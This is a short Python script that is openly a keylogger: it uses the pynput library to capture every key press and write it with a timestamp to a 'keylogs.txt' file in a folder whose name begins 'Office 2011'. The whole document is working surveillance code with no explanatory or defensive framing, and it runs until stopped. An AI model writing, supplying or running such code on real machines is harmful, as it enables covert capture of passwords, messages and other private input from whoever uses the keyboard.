from pynput.keyboard import Key, Listener
import logging
import os

# Specify the directory where you want the log file to be created
log_dir = "C:\Office 2011\key logger (complete)"

# Ensure the specified directory exists, create it if not
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

# Specify the full path for the log file
log_file = os.path.join(log_dir, "keylogs.txt")

# Configure logging to write to the specified file
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
